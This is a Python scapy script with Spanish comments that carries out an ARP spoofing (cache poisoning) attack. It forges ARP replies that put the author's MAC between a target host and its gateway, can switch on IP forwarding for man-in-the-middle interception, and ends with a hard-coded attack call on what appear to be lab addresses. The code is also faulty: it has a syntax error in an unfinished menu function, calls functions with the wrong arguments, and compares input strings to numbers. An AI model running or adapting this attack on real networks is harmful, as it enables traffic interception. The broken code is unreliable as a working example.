import os
from scapy.all import * 


def cambiar_fw(valor):
	f=open("/proc/sys/net/ipv4/ip_forward","w")
	s=str(valor)
	f.write(s)
	f.close()
	

def getMACfromIP(ip,mi_ip):
	pping=IP(dst=ip, src=mi_ip)/ICMP()
	sendp(pping)
	pcap=sniff(filter="icmp and host " + ip,count=1)
	panalisis=pcap[0]

	if (panalisis[IP].src==ip):
		mac=panalisis[Ether].src
	elif (panalisis[IP].dst==ip):
		mac=panalisis[Ether].dst
	else:
		return 0
	print(ip)
	print(mac)
	return mac


def getmac(interface):

  try:
    mac = open('/sys/class/net/'+interface+'/address').readline()
  except:
    mac = "00:00:00:00:00:00"

  return mac[0:17]

def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
	#Obtenemos las direcciones MAC necesarias
	mac_objetivo=getMACfromIP(IP_OBJETIVO)
	mac_gateway=getMACfromIP(IP_GATEWAY)
	mac_propia=getmac("eth0")
	
	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)

	#Enviamos los paquetes para envenenar las tablas
	sendp(p1*1000,inter=1)
	sendp(p2*1000,inter=1)


def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)

	#Enviamos los paquetes para envenenar las tablas
	sendp(p1*1000,inter=1)
	sendp(p2*1000,inter=1)


def buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_GATEWAY,IP_OBJETIVO):
	p=Ether()/ARP()
	p[Ether].dst=MAC_OBJETIVO
	p[Ether].src=MAC_PROPIA
	p[ARP].op="is-at"
	p[ARP].hwsrc=MAC_PROPIA
	p[ARP].psrc=IP_GATEWAY
	p[ARP].hwdst=MAC_OBJETIVO
	p[ARP].pdst=IP_OBJETIVO
	return p

def menuForwarding():
	print("0)Sin Forwarding")
	print("1)Con Forwarding")
	teclado = input()

	if  (teclado == 0):
		cambiar_fw(0)
		print("Desactivando Forwarding")
	elif (teclado == 1):
		cambiar_fw(1)
		print("Activando Forwarding") 

def menuCapa():
	print("0)Capa 2")
	print("1)Capa 3")
	teclado = input()

	if  (teclado == 0):
		print("Introduce la IP de objetivo")
		ip_obj=teclado()
		print(ip_obj)
		#arpPoissoningCapa2()
	elif (teclado == 1):
		

arpPoissoning("10.0.2.4","10.0.2.1","08:00:27:95:8c:5e","08:00:27:7c:4b:c5","52:54:00:12:35:00")
#getMACfromIP("10.0.2.4","10.0.2.15")
#print("0)Dejar de enviar paquetes") 
#sendp(p*1000,inter=1)
#p.show()

